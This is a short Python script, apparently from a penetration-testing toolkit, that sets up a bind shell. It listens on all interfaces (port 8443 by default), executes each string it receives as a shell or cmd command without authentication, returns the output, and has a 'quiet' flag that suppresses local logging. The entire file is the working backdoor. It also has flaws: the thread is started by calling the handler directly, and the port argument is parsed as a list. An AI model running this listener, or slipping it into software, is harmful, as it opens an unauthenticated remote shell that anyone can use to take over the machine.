__author__ = 'Tim Schughart'
'''Linux Bind Shell'''

import socket
import subprocess
import argparse
import threading
import base64
import platform

parser = argparse.ArgumentParser(description='ProSec rockZ')
parser.add_argument("-p", "--port", default=8443,dest="port", action="store", nargs=1, type=int, help="Specifies target port")
parser.add_argument("-q", "--quiet", dest="silent", action="store_true", help="Specifies if the target should output commands, its a boolean")

args = parser.parse_args()

ip="0.0.0.0"
silent=args.silent
port=args.port
operating_system = str(platform.system()).lower()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen(10)

def process(args, operating_system):
    if "linux" in operating_system or "darwin" in operating_system:
        output=subprocess.check_output(args, shell=True)
        return(output)
    if "windows" in operating_system:
        cmd = ["cmd", "/C"]
        for element in args:
            cmd.append(element)
        output = subprocess.check_output(cmd)
        return(output)

def handle_client(client_socket):
    request = client_socket.recv(4096).decode("UTF-8")
    if not silent:
        print("Recieved command: %s" %(request))
    args = request.split()
    try:
        output=process(args, operating_system)
        if not silent:
            print(output)
    except Exception as e:
        if not silent:
            print('Error while executing command')
            print(e)
    client_socket.send(output)

try :
    while True :
        client, addr = s.accept()

        if not silent:
            print("Accepted connection from: %s" %(addr)[0])
        client_handler = threading.Thread(target=handle_client(client,),)
        client_handler.start()
except Exception as e:
    print(e)
    s.close()
    exit(1)